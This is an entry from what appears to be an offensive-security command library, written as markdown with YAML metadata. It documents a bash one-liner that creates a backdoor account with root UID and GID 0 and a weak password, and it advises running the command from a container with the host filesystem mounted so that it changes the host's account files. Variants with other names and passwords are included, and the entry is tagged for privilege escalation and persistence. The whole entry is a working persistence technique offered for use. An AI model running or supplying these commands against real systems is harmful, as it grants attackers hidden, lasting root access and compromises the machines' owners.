---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: useradd-backdoor-root-account
type: command
executor: bash
data: 'useradd -ou 0 -g 0 -m backdoor && echo ''backdoor:password'' | chpasswd'
output: null
created_at: '2023-04-06T03:56:19.469011+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - persistence
verified: true
validated: true
---

# useradd-backdoor-root-account

## Command

```bash
useradd -ou 0 -g 0 -m backdoor && echo 'backdoor:password' | chpasswd
```

## Description

Creates a backdoor user account with root UID/GID (0) and sets a simple password. Run this inside a container with host filesystem mounted to affect the host's /etc/passwd and shadow files.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ou 0 | Set user ID to 0 (root) | Yes |
| -g 0 | Set group ID to 0 (root) | Yes |
| -m | Create home directory | Yes |
| backdoor | Username | Yes |
| password | Password for the account | Yes |

## Examples

### Basic Usage

```bash
useradd -ou 0 -g 0 -m backdoor && echo 'backdoor:password' | chpasswd
```

### Custom User/Password

```bash
useradd -ou 0 -g 0 -m hacker && echo 'hacker:secretpass' | chpasswd
```

## Expected Output

No output on success; verify with `id backdoor` showing uid=0(root) gid=0(root).

## Related

- [[procedures/Linux-Docker-Privilege-Escalation]]
- [[commands/docker-run-bash-with-host-root-mount]]
